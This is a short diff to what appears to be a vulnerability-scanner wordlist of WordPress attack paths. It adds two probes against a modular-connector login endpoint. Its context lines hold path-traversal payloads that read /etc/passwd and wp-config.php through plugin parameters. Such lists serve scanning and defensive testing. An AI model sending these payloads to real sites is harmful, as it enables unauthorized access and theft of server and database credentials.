@@ -100,3 +100,5 @@
 /?wpv-image=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
 /wp-admin/admin-post.php?alg_wc_pif_download_file=../../../../../wp-config.php
 /wp-content/plugins/wpify-woo/deps/dragonbe/vies/examples/async_processing/queue.php/
+/index.php/api/modular-connector/login/{{string}}?origin=mo&type=foo
+/api/modular-connector/login/{{string}}?origin=mo&type=foo
